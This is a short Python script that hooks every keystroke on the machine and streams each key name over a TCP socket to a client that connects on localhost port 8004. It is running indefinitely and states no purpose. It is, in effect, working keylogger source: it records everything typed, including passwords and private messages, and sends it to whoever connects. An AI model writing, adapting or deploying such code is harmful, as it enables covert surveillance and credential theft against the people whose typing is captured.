import socket
import keyboard

# Set up the socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('localhost', 8004))
server_socket.listen(1)
client_socket, address = server_socket.accept()

# Register the callback function for capturing keystrokes
def on_key_press(event):
    # Extract the name of the key pressed
    key = event.name
    # Send the key data through the socket
    client_socket.sendall(key.encode())

# Register the keypress event listener
keyboard.on_press(on_key_press)

# Keep the script running indefinitely
keyboard.wait()

# Clean up
client_socket.close()
server_socket.close()

